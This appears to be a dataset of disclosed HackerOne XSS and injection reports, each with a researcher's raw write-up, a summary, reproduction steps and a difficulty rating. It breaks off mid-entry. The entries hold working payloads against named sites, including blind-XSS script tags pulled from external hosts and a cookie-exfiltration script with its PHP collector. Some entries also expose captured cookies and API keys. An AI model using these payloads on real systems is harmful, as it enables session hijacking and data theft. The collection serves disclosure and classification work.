INJECTIONS EASY
==================================================

Total reports analyzed: 80

Cross-site Scripting (XSS) - DOM Vulnerabilities (5 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1004833: Cross-site Scripting (XSS) - DOM - iqcard.informatica.com
================================================================================
RAW DESCRIPTION:

Hello all
I found a DOM based XSS at iqcard.informatica.com
Description
After finding the path iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html. I noticed that the code inside attach.html was vulnerable to DOM XSS, due to the fact of the javascript document.location function. search. The code below illustrates the code contained in the attach.html file
Code 229 Bytes
1<HTML>
2<HEAD>
3<SCRIPT>
4function GetAttach()
5{
6	var strSearch = document.location.search
7	strSearch = strSearch.substring(1)
8	
9	document.location.replace(strSearch)
10}
11</SCRIPT>
12</HEAD>
13<BODY onload='GetAttach()'>
14
15
16</BODY>
17</HTML>
As can be seen through the code above, the variable strSearch receives everything that comes from the URL after the character? and then insert it into the function document.location.replace (). Through this scenario we have some possibilities.
1 - We can direct the user to any page we want for example:
Code 76 Bytes
1https://iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html?evil.com
2 - We can run a DOM Based XSS, running the javascript schema, javascript: alert (1);
Code 87 Bytes
1https://iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html?javascript:alert(1)
PoC
I uploaded a video and an image.
Impact
An attacker can redirect a user to a malicious page or execute XSS attacks against users of the application or use that domain as a phishing vector to attack other users of informatica.com



================================================================================
Vulnerability Description:
The vulnerability is a DOM-based XSS in the attach.html page of iqcard.informatica.com. The page takes user input from the URL after the '?' character and passes it directly to document.location.replace() without any sanitization, allowing execution of arbitrary JavaScript code or redirection to malicious sites.

Steps to Reproduce:
1. Navigate to the URL: https://iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html?javascript:alert(1)
2. Observe that the JavaScript code in the alert() function is executed due to the DOM XSS vulnerability
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a single component (the URL parameter) and the exploitation is direct with no need for complex interactions or state manipulation. The vulnerability follows a common pattern of unsanitized URL parameters being used in JavaScript functions.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1010132: Possible DOM XSS on app.hey.com
================================================================================
RAW DESCRIPTION:

Summary:
Hello Team,
While testing it was observed that on https://app.hey.com/, on Search box there is a possibility of XSS. Although the payload is reflected in the DOM but the CSP blocks the execution of the script, the XSS can happen if the CSP is somehow bypassed. The Subject parameter is vulnerable.
Apart from XSS, the HTML injection attack is working pretty straight forward.
Steps To Reproduce:
Go to https://app.hey.com
Login to your account.
Click on 'Write' Mail button.
Add the recipient as yourself.
In the Subject, add following payload
Code 76 Bytes
1TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
Send the mail.
Go to top left corner Search Box and type "TestPayload"
You will see the mail you sent to yourself, and <a> tag will be there "ClickHere".
Click on it, you will see the CSP violation in the Console.
Below is the CSP of the page:
Code 368 Bytes
1script-src 'self' https://production.haystack-assets.com stats.hey.com *.braintreegateway.com *.braintree-api.com hcaptcha.com *.hcaptcha.com; 
2object-src 'none'; 
3base-uri 'none'; 
4form-action 'self'; 
5frame-ancestors 'none'; 
6report-uri https://sentry.io/api/1371426/security/?sentry_key=3a5ea420eecc45bd9e1d1c2424683f3a&sentry_environment=production&sentry_release=
As seen from the CSP, there might be a possibility of Host whitelists bypass.
Impact
If attacker send such type of mail to a victim and if victim accidentally searches for the same mail then the Script will be executed leading to account takeover. This is possible only if CSP is bypassed.



================================================================================
Vulnerability Description:
The vulnerability is a DOM-based XSS in the search functionality of app.hey.com, where a malicious payload in the email subject can be rendered as HTML in the search results. While CSP currently blocks script execution, a bypass could lead to arbitrary JavaScript execution.

Steps to Reproduce:
1. Go to https://app.hey.com and log in to your account.
2. Click on 'Write' Mail button, add yourself as recipient, and insert the payload `TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;` into the Subject field. Send the mail.
3. In the top left corner Search Box, type "TestPayload" to find the sent mail. The `<a>` tag "ClickHere" will be rendered.
4. Click on "ClickHere" to observe the CSP violation in the Console.
Exploitation Difficulty:
The attack involves multiple steps (crafting an email, triggering search rendering) and requires understanding of CSP bypass potential, but the core XSS vector is straightforward once the HTML injection is discovered.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/220494: [GitHub Extension] Unsanitised HTML leading to XSS on GitHub.com
================================================================================
RAW DESCRIPTION:

Hi,
I noticed that certain HTML is unsanitised by the Awesome Autocomplete for GitHub extension, leading to a case of XSS on the GitHub website.
Please note that I do not have ownership nor affiliation with the repository and user names in this report, nor the final JavaScript alert dialog.
Proof of Concept
I have tested the following Proof of Concept demonstrations with the following conditions:
Extension
Latest version of the Awesome Autocomplete extension
Operating Systems
macOS Sierra 10.12.4
Windows 7 x64
Browsers
Google Chrome 57.0.2987.133 (latest)
Safari 10.1 (latest)
Unsanitised HTML
Please follow the below steps to demonstrate the presence of an unsanitised HTML issue.
Search for '"><img src=x onerror= on GitHub.com
Note the broken <img> element and requests to "x" on GitHub.com
The following images demonstrate that a broken <img> element was created in the context of GitHub.com by the Algolia extension:
<image_0>
<image_1>
XSS on GitHub
Please follow the below steps to demonstrate the presence of a full XSS issue.
Search for a'"><h1 on GitHub.com
Because of a specific repository name being loaded, a JavaScript alert dialog will appear:
<image_2>
As noted above, I am currently attempting to reproduce this vulnerability using my own repositories and JavaScript code (e.g. document.domain rather than "1337").
Please let me know if you require any additional information regarding these vulnerabilities.
Thanks!



================================================================================
Vulnerability Description:
The Awesome Autocomplete for GitHub extension fails to properly sanitize HTML input, leading to Cross-Site Scripting (XSS) vulnerabilities on GitHub.com. This allows attackers to inject arbitrary HTML and JavaScript code through search queries, which is then executed in the context of GitHub.com.

Steps to Reproduce:
1. Search for '"><img src=x onerror= on GitHub.com and observe the broken <img> element
2. Search for a'"<h1 on GitHub.com to trigger a JavaScript alert dialog
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves basic XSS payloads and does not require complex interactions between components or manipulation of application states. The attack leverages common XSS techniques and the only non-trivial aspect is identifying that the extension does not sanitize HTML input.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/361287: DOMXSS in redirect param
================================================================================
RAW DESCRIPTION:

Summary
The redirect param can consist of a javascript: url, which results in XSS. If a victim visits a malicious URL and logs in, the attacker can perform actions on behalf of the victim.
Steps to reproduce
1) Logout
2) Visit https://lgtm-com.pentesting.semmle.net/?redirect=javascript:prompt(document.domain)%2f%2f
3) Log in through email
Impact
If a victim visits a malicious URL and logs in, the attacker can perform actions on behalf of the victim.



================================================================================
Vulnerability Description:
The redirect parameter in the URL can be manipulated to include a JavaScript URL, leading to DOM-based XSS. When a victim visits a maliciously crafted URL and logs in, the attacker can execute arbitrary JavaScript in the context of the victim's session, potentially performing actions on their behalf.

Steps to Reproduce:
1. Logout from the application
2. Visit the URL: https://lgtm-com.pentesting.semmle.net/?redirect=javascript:prompt(document.domain)%2f%2f
3. Log in through email
Exploitation Difficulty:
The vulnerability involves a straightforward manipulation of a URL parameter to inject JavaScript, which is a common and well-documented attack vector. The steps to reproduce are simple and do not require complex interactions or understanding of intricate application states.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/386334: CSS Injection on /embed/ via bgcolor parameter leaks user's CSRF token and allows for XSS 
================================================================================
RAW DESCRIPTION:

Hi there,
There's a CSS injection here: https://chaturbate.com/embed/admin/?bgcolor=%7D*%7Bbackground:red&tour=nvfS&disable_sound=0&campaign=iNSGX
Code 181 Bytes
1  body, div#main, div.content, div.block, div.section {margin: 0px; padding: 0px;}
2  body {min-width:800px;}
3  div.content {width: 100%;}
4  
5  body {background: }*{background:red;}
6
This allows an attacker to enumerate the CSRF token. Once the CSRF token is enumerated, we can
POC
Go to http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR/reset
Now go to http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR and let it do it's magic :)
<image_0>
There are numerous endpoints like POST /choose_broadcaster_chat_color where it returns Content-Type: text/html; charset=utf-8 that could potentially allow a hacker to combine the two for XSS (I haven't gotten that far yet)
Do you mind asking your HackerOne contact to allow collaboration on your program, so I can invite another researcher that helped me exploit this fully?
Thanks,
Ben
Impact




================================================================================
Vulnerability Description:
The vulnerability involves a CSS injection on the /embed/ endpoint via the bgcolor parameter, which can be exploited to leak a user's CSRF token. This token can then be used to perform CSRF attacks or potentially combined with other endpoints to achieve XSS.

Steps to Reproduce:
1. Navigate to the vulnerable URL with the CSS injection parameter: https://chaturbate.com/embed/admin/?bgcolor=%7D*%7Bbackground:red&tour=nvfS&disable_sound=0&campaign=iNSGX
2. Visit the attacker's demo page to extract the CSRF token: http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR/reset
3. Return to the demo page to observe the stolen token: http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR
Exploitation Difficulty:
The attack requires understanding and exploiting CSS injection to leak sensitive information (CSRF token), and then leveraging that token in subsequent attacks. The interaction between CSS injection and CSRF token leakage is non-obvious and requires multiple steps to execute effectively.

--------------------------------------------------------------------------------



Cross-site Scripting (XSS) - Stored Vulnerabilities (31 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1011888: Improper Sanitization leads to XSS Fire on admin panel
================================================================================
RAW DESCRIPTION:

Summary
Because the HTML is not sanitized when taking the input on https://accounts.informatica.com/registration.html, the input is vulnerable to XSS. When a payload such as
"><script src=https://monty.xss.ht></script>
is put into the form under company it triggers a blind xss. When the payload successfully is loaded, it dumps information as a POC.
Steps to reproduce
1) Goto https://accounts.informatica.com/registration.html and create a temporary account
2) Enter a blind xss payload into the Company field
3) Wait until an admin opens the user record
4) Then, the report should be generated ( I used https://xsshunter.com/)
Supporting Materials
As mentioned, the blind XSS gave me the following IP address who loaded the admin panel:
████████
The URL of where the payload fired:
https://█████████/phnx/driver.aspx?routename=Social/UniversalProfile/UserRecordEdit&TargetUser=480514&FromSearch=True#loaded
This cookie:
Code 1.32 KiB
1wm-cseu-id=%22acd409d8-0f55-4dfd-ac79-d604c5af274e%22; _ga=GA1.2.1915629716.1598908964; wm-fgug=true; wm-ueug=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-nor=true; _gid=GA1.2.244633304.1603115085; wm-ueuT=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-hb={%22sendBaseTime%22:1603115100166}; wm-wmv=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-ds-lfb=%22{}%22; wm-ssn=%22758bcf15-12bc-497e-ab66-f82c25747f45%22; wm-ssn-ct=1603118590494; wm-po-q=null; wm-prsst={%22tId%22:-1%2C%22stt%22:0%2C%22step%22:-1%2C%22spn%22:0%2C%22plgd%22:%22%22%2C%22pint%22:null%2C%22splt%22:[]%2C%22sph%22:[]%2C%22igd%22:null}; wm-ds-lbp=%22[]%22; wm-ds-b=%22[]%22; wm-ds-hb=%22[]%22; wm-ds-lbb=%22{}%22; wm-smtp-init={%22type%22:6}; wm-ds-s=%22[]%22; shoppingcart_coupons=%5B%5D; multiVPoll=; c-s=expires=1603207989~access=/clientimg/informatica/*!/content/informatica/*~md5=832a84c8a012e7d42c375195181dde62; amplitude_id_a328ec1895b18ee52643ef53449b6ecbcsod.com=eyJkZXZpY2VJZCI6IjgwYTA3ZDIxLTA3ZDctNDc4Mi1iNzIxLTc2NTkzMDJkYzg3OFIiLCJ1c2VySWQiOiJENDA4OTY2NUE4OTc5REMyQjUyNDhGMkM1NTk2Q0E1MjdEMzVGQUJFMzA2MTc5REQ0NjA5NEUyQUU1QUJCQUMxIiwib3B0T3V0IjpmYWxzZSwic2Vzc2lvbklkIjoxNjAzMTIxMTg3NTM0LCJsYXN0RXZlbnRUaW1lIjoxNjAzMTIxNTkyODA3LCJldmVudElkIjoyMjIsImlkZW50aWZ5SWQiOjIxOSwic2VxdWVuY2VOdW1iZXIiOjQ0MX0=; wm-po-p=13; wm-po-r=13; wm-dmn=csod.com; _gat=1; wm-ds-lb=%22{}%22
What the XSS saw:
█████
Note that this is leaking what appears to be another customer's data
The full report:
████████
Impact
With this blind XSS vulnerability, a malicious actor could download malware, install a keylogger, steal the admin cookie, and learn IPs of the backend servers and softwares. Also as shown by the screenshot it leaks singular user's names and their corresponding email addresses.



================================================================================
Vulnerability Description:
The vulnerability is a Cross-Site Scripting (XSS) issue on the admin panel due to improper sanitization of HTML input on the registration page. An attacker can inject malicious scripts into the 'Company' field, which executes when an admin views the user record, leading to potential data theft, session hijacking, or malware installation.

Steps to Reproduce:
1. Goto https://accounts.informatica.com/registration.html and create a temporary account
2. Enter a blind xss payload into the Company field
3. Wait until an admin opens the user record
4. Then, the report should be generated (I used https://xsshunter.com/)
Exploitation Difficulty:
The attack involves a straightforward injection of a script payload into a form field, which is a common and well-documented vulnerability. The complexity is low because it does not require manipulation of complex application states or understanding of novel logic. The only non-trivial aspect is the need for an admin to view the record, but this is a typical requirement for blind XSS vulnerabilities.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1017189: Blind Stored XSS on https://█████████ after filling a request at https://█████
================================================================================
RAW DESCRIPTION:

Description:
When you submit a request at https://██████████, the content is being sent to the administrators of the application, and you will be presented with your request status at https://████
The Description field at the request status page is prone to stored xss and blind stored XSS injection, because there is no sanitization on the input being inserted.
As for now this is self (because the link is for the account), i'm 100% sure that when an administrator will check the request his details will get sent to my email, and i have a xss payload stored on my user.
████████
Step-by-step Reproduction Instructions
Register to https://██████████ / login to my account (████)
Navigate to https://███
Craft your XSS payload on the description window
Submit your request
Navigate to https://█████████
The javascript will execute.
Suggested Mitigation/Remediation Actions
Sanitizing the input being inserted into the description window field.
Best regards
nagli
Impact
Stored blind XSS on the pac.whs.mil website which could lead to administrator credentials being leaked.



================================================================================
Vulnerability Description:
The vulnerability is a Blind Stored XSS in the description field of a request submission form. The input is not sanitized, allowing malicious JavaScript to be stored and executed when an administrator views the request, potentially leading to credential leakage.

Steps to Reproduce:
1. Register or log in to the target website.
2. Navigate to the request submission page.
3. Craft and submit an XSS payload in the description field.
4. Navigate to the request status page to observe the XSS execution.
Exploitation Difficulty:
The attack involves straightforward steps without complex interactions or state manipulations. The XSS payload execution is direct once the request is submitted and viewed by an administrator.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1036877: Blind stored XSS due to insecure contact form at https://█████.mil leads to leakage of session token and 
================================================================================
RAW DESCRIPTION:

Summary:
I have discovered a blind stored cross site scripting vulnerability due to an insecure Contact form available here https://███████.mil/ This form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle brackets. I was able to submit a blind xss payload through the form which was triggered in backend /admin panel.
##Steps To Reproduce:
1-Browse to the page at https://██████.mil/and fill out the contact form submitting your blind XSS payload in First name , Last name, Company and description field.
2-Submit the form and have and admin access the information.
3-This will trigger XSS in the admin panel and a notification to the XSS hunter service with details of the event.
Supporting Material/References:
(the screenshot )[██████████]
The IP address that triggered the XSS payload is ████████
Xss hunter Report █████████
Impact
An attacker is able to access critical information from the admin panel. The XSS reveals the administrator’s IP address, backend application service, titles of mail chimp customer and internal subscription emails, admin session cookies.
An attacker can exploit the above cookies to access the admin panel.



================================================================================
Vulnerability Description:
A blind stored cross-site scripting (XSS) vulnerability exists in the contact form at https://█████.mil/ due to insufficient input sanitization. An attacker can submit malicious scripts via the form fields, which are then executed in the admin panel, leading to session token leakage and potential admin panel access.

Steps to Reproduce:
1. Browse to the page at https://█████.mil/ and fill out the contact form, submitting a blind XSS payload in the First Name, Last Name, Company, and Description fields.
2. Submit the form and wait for an admin to access the information, triggering the XSS in the admin panel and notifying the XSS hunter service.
Exploitation Difficulty:
The attack involves submitting a payload through a standard contact form, which is a straightforward process. The complexity is low because it does not require multiple components, subtle interactions, or complex application state manipulation. The vulnerability is a common XSS issue with well-known exploitation methods.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1072616: Stored XSS through name / last name on https://██████████/
================================================================================
RAW DESCRIPTION:

Description:
There is stored XSS Vulnerability on https://█████/██████ by rendering unsafe input being registered on the account name and last name.
███
Step-by-step Reproduction Instructions
Navigate to
Code 330 Bytes
1https://█████/login/?next=/███%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252F████████%252Fcgi%252Flogin.cgi%253Freturn_to%253Dhttps%25253A%25252F%25252F███████%25252Fcgi%25252Fmyaccount.cgi%26client_id%3D6G3AXPQNPXK5SVESYCB8AMCPHQQ3ENCRK8G2QNWY%26state%3DBEAEb6NGMQ7kWZwZS2pNNFv4p7JwBk86%26scope%3Dopenid%2520profile
Create your account, with your name as <IMG SRC=X ONERROR=ALERT(1)>
Log in and navigate to https://███/██████
Suggested Mitigation/Remediation Actions
Sanitizing the input on the account name fields will prevent the issue.
Best Regards
nagli
Impact
Executing javascript on behalf of the victim



================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in the account name and last name fields on the target website. By injecting a malicious script into these fields, an attacker can execute arbitrary JavaScript in the context of the victim's browser when the victim views their account page.

Steps to Reproduce:
1. Navigate to the registration page at https://█████/login/?next=/███%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252F████████%252Fcgi%252Flogin.cgi%253Freturn_to%253Dhttps%25253A%25252F%25252F███████%25252Fcgi%25252Fmyaccount.cgi%26client_id%3D6G3AXPQNPXK5SVESYCB8AMCPHQQ3ENCRK8G2QNWY%26state%3DBEAEb6NGMQ7kWZwZS2pNNFv4p7JwBk86%26scope%3Dopenid%2520profile
2. Create an account with the name or last name field containing the XSS payload: <IMG SRC=X ONERROR=ALERT(1)>
3. Log in and navigate to the account page at https://███/██████ to trigger the XSS payload
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common XSS payload in standard input fields. No complex interactions or state manipulations are required, and the attack vector is well-known.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1245787: [Swiftype] - Stored XSS via document field `url` triggers on `https://app.swiftype.com/engines/<engine>/document_types/<type>/documents/<id>`
================================================================================
RAW DESCRIPTION:

Dear Team,
I have found a stored XSS when create a document via API-based engine. The XSS payload stored in url field.
To understand about document schema for API-based engine, please go to https://swiftype.com/documentation/site-search/guides/schema-design#api-based
After indexed a document with XSS payload stored in url field. When view the document details, click on link View on your site the XSS will triggered.
Step to reproduce
1 - Create a trial account on https://app.swiftype.com/ my admin account email is qwerty.chan8@gmail.com
2 - Create a API-based Engine by visit https://app.swiftype.com/engines/api , choose a Engine name and DocumentType Name and click Create Engine.For example in my case (Engine: 123, DocumentType: test)
<image_0>
3 - Go to https://app.swiftype.com/settings/account and obtain your API Key for example in my case: gB7BT3iA3GhqoU_SWoRq
<image_1>
4 - Call API to create a document follow curl command below, store XSS payload javascript:alert(1) in url and thumbnail_url field value
Code 1.27 KiB
1curl -X POST 'https://api.swiftype.com/api/v1/engines/123/document_types/test/documents.json' \
2  -H 'Content-Type: application/json' \
3  -d '{
4        "auth_token": "gB7BT3iA3GhqoU_SWoRq",
5        "document": {
6          "external_id": "v1uyQZNg2vE",
7          "fields": [
8            {"name": "url", "value": "javascript:alert(1)", "type":  "enum"},
9            {"name": "thumbnail_url", "value": "javascript:alert(1)", "type": "enum"},
10            {"name": "channel_id", "value": "UCK8sQmJBp8GCxrOtXWBpyEA", "type": "enum"},
11            {"name": "title", "value": "How It Feels [through Glass]", "type": "string"},
12            {"name": "caption", "value": "Want to see how Glass actually feels?...", "type": "text"},
13            {"name": "tags", "value": ["glass", "wearable computing", "google"], "type": "string"},
14            {"name": "category_name", "value": "Science & Technology", "type": "string"},
15            {"name": "category_id", "value": 28, "type": "enum"},
16            {"name": "published_at", "value": "2013-02-20T10:47:18", "type": "date"},
17            {"name": "duration", "value": 136, "type": "integer"},
18            {"name": "view_count", "value": 14599202, "type": "integer"},
19            {"name": "like_count", "value": 75952, "type": "integer"}
20          ]
21        }
22     }'
5 - Go to Engine 123 and click on Manage -> Content or https://app.swiftype.com/engines/123/document_types/test/documents#q=&page=1
<image_2>
6 - Click on document ID v1uyQZNg2vE you just created, you can see the document details
<image_3>
7 - Click on the link http://javascript:alert(1) in document details
<image_4>
<image_5>
Impact
Steal other users sessions, trick users go to unwanted websites



================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in Swiftype where a malicious JavaScript payload can be stored in the 'url' and 'thumbnail_url' fields of a document via the API. When a user views the document details and clicks on the link, the XSS payload is executed.

Steps to Reproduce:
1. Create a trial account on Swiftype and create an API-based engine with a document type.
2. Obtain the API key from account settings.
3. Use the API to create a document with a stored XSS payload in the 'url' and 'thumbnail_url' fields.
4. Navigate to the document in the Swiftype interface and click the malicious link to trigger the XSS.
Exploitation Difficulty:
The attack involves straightforward steps: creating an account, using the API to inject the payload, and triggering it via the UI. The components (API and UI) are standard, and the interaction between them is not complex or subtle.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/216822: Stored XSS via transloadit.com and imageproxy
================================================================================
RAW DESCRIPTION:

Hello,
<image_0>
Steps to reproduce:
1) Let's send html file with trivial XSS vector to transloadit.com. Please note that no authentication is required.
POST /assemblies/[hash]?redirect=false HTTP/1.1
Host: isadora.transloadit.com
Referer: https://api.coursera.org/account/profile
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------185739484714145007371896001880
Content-Length: 521
-----------------------------185739484714145007371896001845
Content-Disposition: form-data; name="params"
{"max_size":1048576,"auth":{"key":"[hash2]"},"template_id":"[hash3]"}
-----------------------------185739484714145007371896001845
Content-Disposition: form-data; name="my_file"; filename="stored_xss.html"
Content-Type: text/html
Code 119 Bytes
1<html>
2<script>
3alert(document.cookie);
4</script>
5</html>
6-----------------------------185739484714145007371896001845--
<image_1>
<image_2>
Please find the screenshot attached.
AA



================================================================================
Vulnerability Description:
This vulnerability is a stored XSS via transloadit.com and imageproxy. It allows an attacker to upload an HTML file containing malicious JavaScript, which is then stored and executed when the file is processed by the server, leading to potential cookie theft or other malicious actions.

Steps to Reproduce:
1. Send an HTML file with a trivial XSS vector to transloadit.com via a POST request to /assemblies/[hash]?redirect=false
2. The HTML file contains a script that executes alert(document.cookie) when processed by the server
Exploitation Difficulty:
The attack is straightforward and involves a single component (uploading a malicious HTML file). There are no complex interactions or state manipulations required, and the XSS vector is a common and well-known technique.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/219957: XSS via /api/v1/chat.postMessage 
================================================================================
RAW DESCRIPTION:

NOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!
Summary: An attacker can craft a custom message using the REST API that, once seen by the observer, executes arbitrary code in the context of the client user.
Description: According to the API documentation chat messages can have attachments. These attachments then can have fields which contain a title and subtitle for the attachment. When the attachment has an image_url assigned, the first field's value can be used to inject HTML tags. For example <img onload=""> can be used to execute arbitrary code. < must be the leading character of the field's value property.
Releases Affected:
Client App (OSX)
Firefox 48 (Debian)
Firefox 52 (OSX)
Chrome 58 (OSX)
Steps To Reproduce (from initial installation to vulnerability):
Create a Channel or get obtain a RoomId of a private conversation
Login to the Rest API
Send crafted message
Supporting Material/References:
Code 466 Bytes
1# Login to get Auth Token and User Id
2curl http://127.0.0.1:3000/api/v1/login -d "username=<USER_NAME>&password=<PASSWORD>"
3
4# Send crafted message
5curl -H "X-Auth-Token: <USER_TOKEN>" -H "X-User-Id: <USER_ID>" http://127.0.0.1:3000/api/v1/chat.postMessage -d "channel=<CHANNEL_NAME>&attachments[0][image_url]=/assets/logo&attachments[0][fields][0][title]=&attachments[0][fields][0][value]=<img src=/assets/logo width=1 height=1 onload=alert('XSS4') />You're Pwned!"
Suggested mitigation
Encode all user inputs to HTML entities



================================================================================
Vulnerability Description:
An attacker can craft a custom message with an attachment containing malicious HTML in the field value, which executes arbitrary JavaScript code in the context of the client user when viewed.

Steps to Reproduce:
1. Login to the REST API to obtain an authentication token and user ID.
2. Send a crafted message using the chat.postMessage API endpoint with malicious HTML in the attachment field value.
Exploitation Difficulty:
The vulnerability involves understanding the API's handling of message attachments and the specific condition where HTML injection is possible (when the field value starts with '<'). However, the attack is straightforward once the API's behavior is known.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/247517: Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message which contains payload
================================================================================
RAW DESCRIPTION:

Intro
"Back to the Crayons"
Type of issue: Core CMS issue
Level of severity: External Attack Vector
Concrete5 version: 8.2.0 RC2 rev. 32c9daf352645d4fafedb7b956e7f2de4e153ab3 (July 8th)
Summary
There is Stored XSS vulnerability in Private Messages 'Reply' feature, when original message is quoted in reply content (this is by default). This issue can be used against any user, who accepted receiving private messages and replies to the message contains malicious payload.
To exploit this vulnerability an attacker has to trick other user to reply to his message.
Steps to reproduce
log in to concrete5 instance as any user
go to index.php/account/messages. Change url to index.php/account/messages/write/1 which is equivalent to sending PM to admin (changing user id in url to any other value allows to send message to selected user)
set message title, then as a content of message put (at the end): closing </textarea> tag followed by any valid JavaScript code inside <script> tag.
<image_0>
I used following payload in my attack:
Code 170 Bytes
1</textarea>
2<script>
3    var i = document.createElement('img')
4    i.src = 'https://bl4de.000webhostapp.com/?c=' + document.cookie;
5    document.body.append(i);
6</script>
It creates and appends img element with url which points to my server on 000web hosting and allows to send cookie(s) to my PHP script:
Code 88 Bytes
1Hello :)
2<?php
3if (isset($_GET['c'])) {
4	file_put_contents("cookies.txt", $_GET['c']);
5}
send message
To verify that vulnerability exists, log in as admin (or any user you've sent message to) and go to Private Messages Inbox:
<image_1>
open message
The content is properly sanitized (no JavaScript executed):
<image_2>
Now the fun part begins.
Select Reply from the dropdown with message menu. As you can see, content of the original message is embeded below ------- Original Message ------- separator, however - is not sanitized, causes JavaScript script is executed in context of logged admin (my sample attack scenario tries to steal cookie to hijack admin session and failed due to Http Only flag set, but it does not change the fact that Stored XSS attack works):
<image_3>
When we inspect HTML source, we can verify that closing </textarea> tag from payload allows to "escape" from message textarea and append and run JavaScript:
Code 667 Bytes
1<div class="form-group">
2				<label for="body" class="control-label">Message</label>				<textarea id="msgBody" name="msgBody" rows="8" class="span5 form-control">
3
4
5-------------------- Original Message --------------------
6From: kotek
7Date Sent: Jul 9, 2017, 9:55 PM
8Subject: Problem with page!!!
9
10Hi, could you please take a look at this and reply? Thanks!
11
12</textarea>
13<script>
14        var i = document.createElement('img')
15        i.src = 'https://bl4de.000webhostapp.com/?c=' + document.cookie;
16        document.body.append(i);
17    </script></textarea>			</div>
18
19			<div class="ccm-dashboard-form-actions-wrapper">
20			    <div class="ccm-dashboard-form-actions">
In presented PoC, one cookie was sent and saved on my 000web application:
<image_4>
Impact
Any user is able to send PM to other user(s) with malicious payload trying to trick them to reply to his message. This scenario is described as External Attack Vector in Concrete5 program policy.
Testing environment
System:
Concrete5 version 8.2.0 RC2, commit 32c9daf352645d4fafedb7b956e7f2de4e153ab3 from July 8th, installed localy
PHP ver. 5.6.30
Apache HTTP Server 2.4.25 for macOS
MySQL ver. 5.7.13 for macOS
This vulnerability was tested on macOS Sierra 10.12.5 with following browsers:
Chrome 59.0.3071.115
Chromium build 61.0.3131.0
Opera 46.0.2597.32
Wrap up
I hope my report will help keep Concrete5 safe in the future.
Best Regards,
Rafal 'bl4de' Janicki



================================================================================
Vulnerability Description:
Stored XSS vulnerability in the Private Messages 'Reply' feature where malicious JavaScript in the original message is executed when the recipient replies, due to improper sanitization of quoted content.

Steps to Reproduce:
1. Log in to the Concrete5 CMS as any user
2. Navigate to the private messages section and send a message containing a malicious XSS payload (closing </textarea> tag followed by JavaScript in a <script> tag)
3. Have another user (e.g., admin) receive and reply to this message, triggering the XSS payload execution
Exploitation Difficulty:
The vulnerability involves understanding the interaction between message quoting and textarea context, but the attack vector is straightforward once the XSS payload structure is known. The main complexity lies in recognizing the opportunity to escape the textarea context with a closing tag.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/251224: Blind stored xss [parcel.grab.com] > name parameter 
================================================================================
RAW DESCRIPTION:

Hi,
my previously reported blind xss is fixed but i found same type of xss in diffrent area with more impact.
Steps to repro:
create new account with name "><script src=https://x.com></script> here https://parcel.grab.com/
afftected page is https://app.detrack.com/a/ where admin can see all the user's of application and this is one more impact full because it contains all the user's email address. attacker can hijack all the information from there using xss affeffcted page poc: {F204498██████████
go here https://app.detrack.com/a/ and find ████████ , that is my account with xss payload.
thanks



================================================================================
Vulnerability Description:
A blind stored XSS vulnerability exists in the 'name' parameter of the user account creation process on parcel.grab.com. This vulnerability allows an attacker to inject malicious JavaScript that executes when an administrator views the user list on app.detrack.com/a/, potentially leading to data theft or session hijacking.

Steps to Reproduce:
1. Create a new account on https://parcel.grab.com/ with the name parameter set to a XSS payload: "><script src=https://x.com></script>
2. Navigate to the admin panel at https://app.detrack.com/a/ where the XSS payload will execute when the admin views the user list, potentially exposing sensitive user data.
Exploitation Difficulty:
The vulnerability involves a straightforward XSS injection in a user-controllable field that persists and executes in a different administrative context. While it requires understanding where the input is reflected, the attack itself is not complex and follows common XSS patterns.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/283565: XSS on infogram.com
================================================================================
RAW DESCRIPTION:

Hello,
There is a XSS on Report templates.
Free templates : Report Classic
When we modify the values of table we can put XSS Payload.
Payload used :
"><img src=x onerror=prompt(0);>
"/><svg/onload=alert(0);>



================================================================================
Vulnerability Description:
This is a Cross-Site Scripting (XSS) vulnerability in the 'Report Classic' template on infogram.com. By modifying table values, an attacker can inject malicious JavaScript payloads that execute when the template is rendered.

Steps to Reproduce:
1. Navigate to infogram.com and select the 'Report Classic' template under free templates.
